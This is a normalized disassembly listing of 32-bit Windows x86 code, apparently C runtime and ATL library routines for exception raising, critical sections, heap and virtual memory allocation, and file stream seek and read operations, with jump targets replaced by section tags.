lea ecx [ ebp - 0x28 ]
call sub_429dd0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_426140
push r--data
lea eax [ ebp - 0x50 ]
push eax
call sub_442eab
int3
sub_43f149
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp eax [ ecx + 0x4 ]
jge r-xdata
mov ecx [ ecx ]
lea eax [ ecx + eax * 4 ]
pop ebp
retn 0x4
sub_43f1a9
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
lea edi [ esi + 0x14 ]
push edi
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0x30 ]
mov ecx [ ebp + 0x8 ]
cmp ecx eax
jg r-xdata
push edi
call [ LeaveCriticalSection@IAT ]
xor eax eax
test ecx ecx
jl r-xdata
cmp ecx eax
jne r-xdata
push ecx
lea ecx [ esi + 0x2c ]
call sub_43f149
mov esi [ eax ]
jmp r-xdata
mov esi [ esi + 0x8 ]
push edi
call [ LeaveCriticalSection@IAT ]
mov eax esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_43f1f8
mov edi edi
push esi
mov esi ecx
call sub_43f175
mov eax __dos_header
lea ecx [ esi + 0x14 ]
mov [ esi ] 0x38
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0xc ] 0x900
mov [ esi + 0x10 ] r--data
call sub_41a300
test eax eax
jge r-xdata
mov eax esi
pop esi
retn
mov [ rw-data ] 0x1
sub_43f287
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
jne r-xdata
cmp [ ebp + 0xc ] eax
jne r-xdata
push [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax ]
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
push [ ecx + 0x4 ]
call [ HeapReAlloc@IAT ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
xor eax eax
jmp r-xdata
pop ebp
retn 0x8
sub_43f2d8
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_43f238
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43f960
pop ecx
sub_43f2f9
mov edi edi
push ebp
mov ebp esp
mov eax ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x4 ] ecx
mov [ eax ] r--data
xor ecx ecx
mov [ eax + 0x14 ] 0x2
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x18 ] cx
mov [ eax + 0x1a ] cx
mov [ eax + 0x8 ] eax
pop ebp
retn 0x4
sub_43f349
mov edi edi
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43f960
pop ecx
sub_43f36b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx ecx
jae r-xdata
add eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
xor eax eax
pop ebp
retn
mov eax 0x80070057
pop ebp
retn
sub_43f391
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
add esi 0x8
and esi 0xfffffff8
lea eax [ ebp + 0x8 ]
push esi
push eax
mov edi ecx
call sub_41a8c0
add esp 0xc
test eax eax
jl r-xdata
xor eax eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0x8 ]
push 0x10
push eax
call sub_43f36b
add esp 0xc
test eax eax
jl r-xdata
mov ecx [ edi + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax ]
test eax eax
je r-xdata
dec esi
and [ eax + 0x4 ] 0x0
mov [ eax ] edi
mov [ eax + 0xc ] 0x1
mov [ eax + 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
sub_43f3f5
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
add esi 0x8
and esi 0xfffffff8
lea eax [ ebp + 0xc ]
push esi
push eax
mov edi ecx
call sub_41a8c0
add esp 0xc
test eax eax
jl r-xdata
xor eax eax
push [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push 0x10
push eax
call sub_43f36b
add esp 0xc
test eax eax
jl r-xdata
push [ ebp + 0xc ]
mov ecx [ edi + 0x4 ]
push [ ebp + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
test eax eax
je r-xdata
dec esi
mov [ eax + 0x8 ] esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0xc
sub_43f450
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
push [ ebp + 0x8 ]
cmp eax 0x1
jne r-xdata
push eax
call [ rw-data ]
pop ebp
retn
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
pop ebp
retn
sub_43f47c
push 0xc
call [ IsProcessorFeaturePresent@IAT ]
test eax eax
jne r-xdata
push ebx
push esi
push edi
push r--data
call [ LoadLibraryA@IAT ]
mov edi eax
xor ebx ebx
cmp edi ebx
je r-xdata
inc eax
mov [ rw-data ] eax
retn
cmp [ rw-data ] ebx
je r-xdata
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
xor eax eax
cmp [ rw-data ] ebx
je r-xdata
mov eax [ fs : 0x18 ]
mov esi [ eax + 0x30 ]
add esi 0x34
mov eax [ esi ]
cmp eax ebx
jne r-xdata
mov [ rw-data ] eax
xor eax eax
inc eax
jmp r-xdata
push 0x8
push ebx
mov ebx [ GetProcessHeap@IAT ]
call ebx
push eax
call [ HeapAlloc@IAT ]
mov edi eax
xor eax eax
cmp edi eax
je r-xdata
pop edi
pop esi
pop ebx
retn
push eax
push edi
push esi
mov [ edi ] eax
mov [ edi + 0x4 ] eax
call [ InterlockedCompareExchange@IAT ]
test eax eax
je r-xdata
mov eax [ esi ]
push edi
push 0x0
call ebx
push eax
call [ HeapFree@IAT ]
sub_43f543
cmp [ rw-data ] 0x0
push esi
jne r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_43f47c
test eax eax
je r-xdata
push eax
call [ rw-data ]
test eax eax
jne r-xdata
push 0xd
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
pop esi
retn
pop esi
retn
push 0x40
mov eax 0x1000
push eax
push eax
push 0x0
call [ VirtualAlloc@IAT ]
mov esi eax
test esi esi
jne r-xdata
pop esi
retn
mov eax [ esi ]
push edi
push [ rw-data ]
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
mov edi esi
add esi 0xff0
push 0x8000
push 0x0
push esi
call [ VirtualFree@IAT ]
jmp r-xdata
push edi
push [ rw-data ]
call [ rw-data ]
add edi 0x10
cmp edi esi
jb r-xdata
mov eax edi
pop edi
sub_43f5e8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ eax ] 0x2c
jne r-xdata
mov eax 0x80070057
jmp r-xdata
and [ eax + 0x1c ] 0x0
lea ecx [ eax + 0x4 ]
call sub_41a300
pop ebp
retn 0x4
sub_43f610
mov edi edi
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
and [ esi + 0x8 ] 0x0
pop esi
retn
push eax
call sub_44120e
and [ esi ] 0x0
pop ecx
sub_43f62f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jl r-xdata
push 0x0
push 0x0
push 0x1
push 0xc000008c
call [ RaiseException@IAT ]
int3
cmp eax [ ecx + 0x4 ]
jge r-xdata
mov ecx [ ecx ]
lea eax [ ecx + eax * 2 ]
pop ebp
retn 0x4
sub_43f677
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi ]
cmp eax edi
je r-xdata
mov eax 0x80070057
jmp r-xdata
xor eax eax
cmp eax 0x2c
jne r-xdata
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x24 ] edi
jle r-xdata
lea ecx [ esi + 0x20 ]
call sub_43f610
lea eax [ esi + 0x4 ]
push eax
call [ DeleteCriticalSection@IAT ]
and [ esi ] 0x0
push ebx
lea ebx [ esi + 0x20 ]
push edi
mov ecx ebx
call sub_43f62f
movzx eax [ eax ]
push [ ebp + 0xc ]
push eax
call [ UnregisterClassA@IAT ]
inc edi
cmp edi [ esi + 0x24 ]
jl r-xdata
pop ebx
sub_43f6db
mov edi edi
push esi
mov esi ecx
call sub_43f65b
push esi
mov [ esi ] 0x2c
call sub_43f5e8
test eax eax
jge r-xdata
mov eax esi
pop esi
retn
mov [ rw-data ] 0x1
and [ esi ] 0x0
sub_43f71d
mov edi edi
push esi
mov esi ecx
cmp [ esi ] 0x0
je r-xdata
pop esi
retn
push ebx
mov ebx [ esi + 0x8 ]
cmp ebx [ esi + 0xc ]
jae r-xdata
lea eax [ esi + 0x10 ]
push eax
call [ DeleteCriticalSection@IAT ]
and [ esi ] 0x0
pop ebx
push edi
add ebx 0x4
cmp ebx [ esi + 0xc ]
jb r-xdata
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
mov edi [ ebx ]
test edi edi
je r-xdata
pop edi
and [ edi + 0x10 ] 0x0
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_43f761
mov edi edi
push esi
mov esi ecx
push edi
lea edi [ esi + 0x10 ]
mov ecx edi
call sub_41a190
and [ esi ] 0x0
mov ecx edi
mov [ esi + 0x4 ] __dos_header
mov [ esi + 0x8 ] r--data
mov [ esi + 0xc ] r--data
call sub_41a300
test eax eax
jge r-xdata
mov [ esi ] 0x28
mov [ rw-data ] 0x1
jmp r-xdata
pop edi
mov eax esi
pop esi
retn
sub_43f7d0
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push ecx
push edx
call [ rw-data ]
mov esp ebp
pop ebp
retn 0xc
mov ecx [ eax ]
lea edx [ ebp + 0xc ]
push edx
push r--data
push eax
mov eax [ ecx ]
call eax
test eax eax
jl r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ eax ]
push esi
push edx
push eax
mov eax [ ecx + 0xc ]
call eax
mov esi eax
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test esi esi
pop esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x0
call [ GetErrorInfo@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0x0
sub_43f850
mov edi edi
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
pop esi
retn
call [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
push ecx
push 0x0
push eax
call [ HeapFree@IAT ]
sub_43f890
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x0
call sub_442eab
int3
sub_43f8d0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ eax + 0x4 ]
mov [ esi + 0x4 ] ecx
mov edx [ eax + 0x8 ]
mov eax edx
mov [ esi + 0x8 ] edx
mov [ esi + 0xc ] 0x0
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
push eax
call edx
sub_43f910
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
mov [ esi ] r--data
test eax eax
je r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
test [ ebp + 0x8 ] 0x1
je r-xdata
call [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43f960
add esp 0x4
mov ecx [ esi + 0xc ]
push ecx
push 0x0
push eax
call [ HeapFree@IAT ]
sub_43f985
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_443360
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_443790
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_443b37
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
mov eax esi
jmp r-xdata
sub_43fa1d
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
jmp r-xdata
push [ ebp + 0x8 ]
call sub_441c3d
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_443b8f
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov esi rw-data
jne r-xdata
push esi
lea ecx [ ebp - 0xc ]
call sub_429fc0
push r--data
lea eax [ ebp - 0xc ]
push eax
call sub_442eab
int3
or [ rw-data ] 0x1
mov ecx esi
call sub_43fa02
push sub_45b90c
call sub_4413c3
pop ecx
sub_43fa93
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi ecx
mov [ edi ] r--data
mov eax [ ebx ]
test eax eax
je r-xdata
and [ edi + 0x4 ] 0x0
push eax
call sub_442e20
mov esi eax
inc esi
push esi
call sub_441c3d
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
mov [ edi + 0x8 ] 0x1
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx ]
push esi
push eax
call sub_443bb7
add esp 0xc
jmp r-xdata
sub_43fb03
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_442e20
mov edi eax
inc edi
push edi
call sub_441c3d
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_443bb7
add esp 0xc
jmp r-xdata
sub_43fb83
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_43fb60
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43f960
pop ecx
sub_43fbb4
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_43fba4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43f960
pop ecx
sub_43fbd5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add ecx 0x9
push ecx
add eax 0x9
push eax
call sub_443c90
neg eax
pop ecx
sbb eax eax
pop ecx
inc eax
pop ebp
retn 0x4
sub_43fbf5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
xor edi edi
cmp eax edi
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] edi
jne r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop edi
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_441f70
add esp 0xc
call sub_443b37
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
mov eax esi
jmp r-xdata
sub_43fc91
push 0xc
push r--data
call sub_4433dc
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
cmp edi esi
setne al
cmp eax esi
je r-xdata
call sub_443b37
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_440791
add esp 0x14
xor eax eax
cmp [ edi ] si
setne al
cmp eax esi
je r-xdata
call sub_443421
retn
call sub_444181
mov [ ebp + 0x8 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] esi
cmp [ ebx ] si
jne r-xdata
call sub_443b37
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push edi
push ebx
call sub_443ecd
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43fd4d
mov eax [ ebp - 0x1c ]
call sub_443b37
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_4442bc
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_43fd6e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
jne r-xdata
push 0x80
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_43fc91
add esp 0xc
mov [ edi ] eax
cmp eax esi
je r-xdata
call sub_443b37
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_440791
add esp 0x14
mov eax edi
jmp r-xdata
call sub_443b37
mov eax [ eax ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_43fdc1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_443b37
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_444592
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_43fed0
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_444560
pop ecx
push eax
call sub_444484
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
dec ecx
mov eax ecx
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_43fe4b
push 0xc
push r--data
call sub_4433dc
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
mov edi [ ebp + 0x10 ]
cmp edi esi
je r-xdata
call sub_443b37
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_443def
pop ecx
mov [ ebp - 0x4 ] esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43fdc1
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43fec6
mov eax [ ebp - 0x1c ]
cmp edi 0x1
je r-xdata
call sub_443421
retn
cmp edi 0x2
jne r-xdata
sub_43fed0
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
jne r-xdata
push edi
call sub_444560
cmp [ edi + 0x4 ] ebx
pop ecx
mov [ ebp - 0x4 ] eax
jge r-xdata
call sub_443b37
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_440791
add esp 0x14
push 0x1
push ebx
push eax
call sub_444484
add esp 0xc
cmp eax ebx
mov [ ebp - 0x8 ] eax
jl r-xdata
mov [ edi + 0x4 ] ebx
pop edi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov edx [ edi + 0xc ]
test edx 0x108
jne r-xdata
mov eax [ edi ]
mov ecx [ edi + 0x8 ]
push esi
mov esi eax
sub esi ecx
mov [ ebp - 0xc ] esi
test dl 0x3
je r-xdata
sub eax [ edi + 0x4 ]
jmp r-xdata
test dl dl
js r-xdata
mov edx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sar edx 0x5
mov edx [ edx * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
test [ edx + esi + 0x4 ] 0x80
je r-xdata
cmp [ ebp - 0x8 ] ebx
jne r-xdata
call sub_443b37
mov [ eax ] 0x16
jmp r-xdata
mov edx ecx
cmp edx eax
jae r-xdata
test [ edi + 0xc ] 0x1
je r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
add eax ecx
mov edx [ edi + 0x4 ]
cmp edx ebx
jne r-xdata
pop esi
inc edx
cmp edx esi
jb r-xdata
inc [ ebp - 0xc ]
xor ebx ebx
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x4 ]
sub eax ecx
add eax edx
sar ebx 0x5
and esi 0x1f
lea ebx [ ebx * 4 + rw-data ]
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
shl esi 0x6
test [ eax + esi + 0x4 ] 0x80
je r-xdata
mov [ ebp - 0xc ] ebx
jmp r-xdata
cmp [ edx ] 0xa
jne r-xdata
mov eax [ ebp + 0x8 ]
sub [ ebp - 0x8 ] eax
push 0x2
push 0x0
push [ ebp - 0x4 ]
call sub_444484
add esp 0xc
cmp eax [ ebp - 0x8 ]
jne r-xdata
push 0x0
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call sub_444484
add esp 0xc
test eax eax
jge r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ ebp + 0x8 ]
add ecx eax
jmp r-xdata
mov eax 0x200
cmp [ ebp + 0x8 ] eax
ja r-xdata
cmp eax ecx
jb r-xdata
mov eax [ edi + 0x18 ]
mov ecx [ edi + 0xc ]
test cl 0x8
je r-xdata
cmp [ eax ] 0xa
jne r-xdata
test [ edi + 0xc ] 0x2000
jmp r-xdata
inc [ ebp + 0x8 ]
test ecx 0x400
je r-xdata
inc eax
inc [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0x8 ] eax
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x4
sub_44006d
push 0xc
push r--data
call sub_4433dc
xor eax eax
xor esi esi
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_443def
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x8 ]
call sub_43fed0
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4400d1
mov eax [ ebp - 0x1c ]
call sub_443b37
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_440791
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_443421
retn
sub_4400db
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ebx
cmp [ ebp + 0x10 ] edi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] edi
je r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
call sub_443b37
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
push edi
cmp ebx 0xffffffff
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
jbe r-xdata
cmp esi edi
je r-xdata
push ebx
push edi
push ecx
call sub_443360
add esp 0xc
mov edi [ ebp + 0x10 ]
imul edi [ ebp + 0x14 ]
test [ esi + 0xc ] 0x10c
mov [ ebp - 0x10 ] edi
mov ebx edi
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
cmp [ ebp + 0x14 ] eax
ja r-xdata
mov [ ebp - 0xc ] 0x1000
mov eax [ esi + 0x18 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
test [ esi + 0xc ] 0x10c
je r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp ebx [ ebp - 0xc ]
jb r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push esi
call sub_444979
pop ecx
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
jl r-xdata
mov eax edi
sub eax ebx
xor edx edx
div [ ebp + 0x10 ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
cmp ebx eax
ja r-xdata
mov ecx 0x7fffffff
xor edx edx
cmp ebx ecx
jbe r-xdata
or [ esi + 0xc ] 0x20
mov edi ebx
cmp ebx eax
jb r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov [ ecx ] al
mov eax [ esi + 0x18 ]
dec ebx
dec [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
cmp eax [ ebp - 0x4 ]
ja r-xdata
mov eax ebx
mov eax ebx
div [ ebp - 0xc ]
mov eax ebx
mov eax ecx
div [ ebp - 0xc ]
mov eax ecx
jmp r-xdata
cmp edi [ ebp - 0x4 ]
ja r-xdata
mov edi eax
call sub_443b37
mov [ eax ] 0x22
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_443360
add esp 0xc
push eax
push [ ebp - 0x8 ]
push esi
call sub_444560
pop ecx
push eax
call sub_445066
add esp 0xc
test eax eax
je r-xdata
sub eax edx
jmp r-xdata
xor esi esi
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
push edi
push [ esi ]
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
call sub_43f985
sub [ esi + 0x4 ] edi
add [ esi ] edi
add [ ebp - 0x8 ] edi
sub ebx edi
add esp 0x10
sub [ ebp - 0x4 ] edi
mov edi [ ebp - 0x10 ]
jmp r-xdata
call sub_440791
add esp 0x14
or [ esi + 0xc ] 0x10
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
call sub_443b37
push esi
push esi
push esi
push esi
mov [ eax ] 0x22
push esi
jmp r-xdata
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_443360
add esp 0xc
test ebx ebx
jne r-xdata
add [ ebp - 0x8 ] eax
sub ebx eax
sub [ ebp - 0x4 ] eax
jmp r-xdata
sub_4402e5
push 0xc
push r--data
call sub_4433dc
xor esi esi
mov [ ebp - 0x1c ] esi
cmp [ ebp + 0x10 ] esi
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] esi
je r-xdata
cmp [ ebp + 0x18 ] esi
jne r-xdata
push [ ebp + 0x18 ]
call sub_443def
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4400db
add esp 0x14
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_440371
mov eax [ ebp - 0x1c ]
jmp r-xdata
cmp [ ebp + 0xc ] 0xffffffff
je r-xdata
call sub_443421
retn
call sub_443b37
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_440791
add esp 0x14
push [ ebp + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_443360
add esp 0xc
sub_440398
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
or ebx 0xffffffff
cmp esi edi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_443b37
push edi
push edi
push edi
push edi
push edi
